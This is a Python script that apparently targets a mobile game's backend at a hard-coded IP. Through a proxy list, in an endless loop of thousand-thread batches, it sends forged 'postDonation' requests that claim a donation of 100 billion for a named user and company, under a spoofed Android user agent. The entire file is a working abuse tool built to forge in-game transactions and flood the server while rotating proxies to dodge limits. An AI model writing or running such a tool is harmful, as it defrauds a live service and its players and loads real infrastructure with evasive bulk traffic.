import requests
import concurrent.futures
import threading
import time
from datetime import datetime
from itertools import cycle

# ================= CONFIG =================
PROXY_FILE = "natop2k.txt"
BATCH_SIZE = 1000
COOLDOWN = 30  # seconds before a batch can be reused
REQUEST_TIMEOUT = 60
MAX_WORKERS_PER_BATCH = 1000

donation_api = (
    "http://52.24.104.170:8086/RestSimulator?Operation=postDonation&available_patriotism=1000&company_id=4579286&company_name=G%C3%98M%C3%82ST%C3%84R%F0%9F%91%BD%5BELITE+FOUNDER%5D%0A&country=Germany&donation_sum=100000000000&donation_type=0&sender_company_id=4579286&user_id=C28759C6A78E4E22AC93D78F107E5C72&version_code=23&war_id=57854"
)

headers = {
    'User-Agent': 'android-asynchttp://loopj.com/android-async-http'
}

# ==========================================

def load_proxies():
    with open(PROXY_FILE, "r") as f:
        return [line.strip() for line in f if line.strip()]

def chunk_proxies(proxies, size):
    for i in range(0, len(proxies), size):
        yield proxies[i:i + size]

def make_request(proxy):
    # remove http:// if already present
    clean_proxy = proxy.replace("http://", "").replace("https://", "")
    proxy_dict = {
        'http': f'http://{clean_proxy}',
        'https': f'http://{clean_proxy}'
    }
    try:
        r = requests.get(
            donation_api,
            headers=headers,
            proxies=proxy_dict,
            timeout=REQUEST_TIMEOUT
        )
        with open("response_log.txt", "a") as log:
            log.write(
                f"{datetime.now()} | {proxy} | {r.status_code}\n"
            )
    except Exception as e:
        with open("error_log.txt", "a") as log:
            log.write(
                f"{datetime.now()} | {proxy} | {e}\n"
            )

def run_batch(batch, batch_id):
    print(f"[+] Starting batch {batch_id} with {len(batch)} proxies")
    with concurrent.futures.ThreadPoolExecutor(
        max_workers=MAX_WORKERS_PER_BATCH
    ) as executor:
        executor.map(make_request, batch)

def main():
    proxies = load_proxies()
    batches = list(chunk_proxies(proxies, BATCH_SIZE))
    batch_cycle = cycle(enumerate(batches, start=1))

    while True:
        used_batches = []

        for batch_id, batch in batch_cycle:
            t = threading.Thread(
                target=run_batch,
                args=(batch, batch_id),
                daemon=True
            )
            t.start()
            used_batches.append(t)

            # move instantly to next batch (no delay here)
            if batch_id == len(batches):
                break

        print("[*] All batches used. Cooling down...")
        time.sleep(COOLDOWN)
        print("[*] Restarting proxy cycle...\n")

if __name__ == "__main__":
    main()